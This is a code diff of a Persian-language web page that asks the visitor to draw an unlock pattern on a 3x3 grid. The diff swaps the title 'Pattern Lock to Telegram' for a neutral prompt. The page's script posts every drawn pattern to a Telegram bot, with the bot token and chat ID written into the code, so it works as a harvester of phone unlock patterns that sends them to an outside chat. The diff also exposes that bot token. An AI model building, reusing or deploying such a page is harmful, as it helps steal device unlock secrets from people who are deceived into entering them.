@@ -1,19 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>Pattern Lock to Telegram</title>
-  <script src="https://cdn.jsdelivr.net/npm/pattern-lock-js@1.0.0/dist/patternlock.min.js"></script>
-  <link href="https://cdn.jsdelivr.net/npm/pattern-lock-js@1.0.0/dist/patternlock.min.css" rel="stylesheet" />
+  <title>الگوی خود را بکشید</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      font-family: "Segoe UI", sans-serif;
+      font-family: sans-serif;
+      background-color: #f2f2f2;
       text-align: center;
-      margin-top: 60px;
-      background-color: #f9f9f9;
+      padding: 20px;
+    }
+    h2 {
+      margin-bottom: 30px;
     }
     #patternContainer {
-      width: 220px;
+      width: 250px;
+      height: 250px;
       margin: 0 auto;
     }
     #output, #status {
@@ -26,6 +29,9 @@
     #status.error {
       color: red;
     }
+    canvas {
+      touch-action: none;
+    }
   </style>
 </head>
 <body>
@@ -35,19 +41,83 @@
 <div id="output"></div>
 <div id="status"></div>
 
+<!-- اسکریپت pattern lock -->
 <script>
+  class PatternLock {
+    constructor(container, options) {
+      this.container = document.querySelector(container);
+      this.options = options || {};
+      this.pattern = [];
+      this.init();
+    }
+
+    init() {
+      const size = 3;
+      const html = Array.from({ length: size * size }, (_, i) =>
+        `<div class="dot" data-pos="${i + 1}"></div>`
+      ).join("");
+
+      this.container.style.display = "grid";
+      this.container.style.gridTemplateColumns = `repeat(${size}, 1fr)`;
+      this.container.style.gap = "20px";
+
+      this.container.innerHTML = html;
+
+      this.container.querySelectorAll(".dot").forEach(dot => {
+        dot.style.width = "50px";
+        dot.style.height = "50px";
+        dot.style.border = "2px solid #000";
+        dot.style.borderRadius = "50%";
+        dot.style.backgroundColor = "#fff";
+      });
+
+      let isDrawing = false;
+      this.pattern = [];
+
+      const handleTouch = (e) => {
+        const touch = e.touches[0];
+        const el = document.elementFromPoint(touch.clientX, touch.clientY);
+        if (el && el.dataset && el.dataset.pos) {
+          const pos = el.dataset.pos;
+          if (!this.pattern.includes(pos)) {
+            this.pattern.push(pos);
+            el.style.backgroundColor = "#0f0";
+          }
+        }
+      };
+
+      this.container.addEventListener("touchstart", (e) => {
+        e.preventDefault();
+        this.pattern = [];
+        this.container.querySelectorAll(".dot").forEach(dot => {
+          dot.style.backgroundColor = "#fff";
+        });
+        isDrawing = true;
+      });
+
+      this.container.addEventListener("touchmove", (e) => {
+        if (isDrawing) handleTouch(e);
+      });
+
+      this.container.addEventListener("touchend", () => {
+        isDrawing = false;
+        this.options.onPattern && this.options.onPattern(this.pattern.join(""));
+      });
+    }
+  }
+
+  // اجرای قفل
   const lock = new PatternLock("#patternContainer", {
     onPattern: function(pattern) {
-      const output = document.getElementById("output");
+      document.getElementById("output").innerText = "🔒 الگوی وارد شده: " + pattern;
       const status = document.getElementById("status");
-
-      output.innerText = "الگوی وارد شده: " + pattern;
-      status.innerText = "در حال ارسال به تلگرام...";
-      status.className = "";
 
       const token = "5828170484:AAGx5Lbjc9ebQd0YuJ7l-REnXSUoS7OhjAc";
       const chatId = "1353504783";
-      const message = `🔒 الگوی وارد شده:\n${pattern}`;
+      const message = `🔐 الگوی وارد شده:\n${pattern}`;
+
+      status.innerText = "در حال ارسال...";
+      status.className = "";
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
@@ -62,17 +132,17 @@
       .then(response => response.json())
       .then(data => {
         if (data.ok) {
-          status.innerText = "✅ با موفقیت به ربات تلگرام ارسال شد.";
+          status.innerText = "✅ با موفقیت ارسال شد به تلگرام.";
           status.className = "success";
         } else {
-          status.innerText = "❌ خطا در ارسال به تلگرام.";
+          status.innerText = "❌ خطا در ارسال.";
           status.className = "error";
         }
       })
       .catch(error => {
         status.innerText = "❌ خطا در ارتباط با ربات.";
         status.className = "error";
-        console.error("Error:", error);
+        console.error("ERROR:", error);
       });
     }
   });
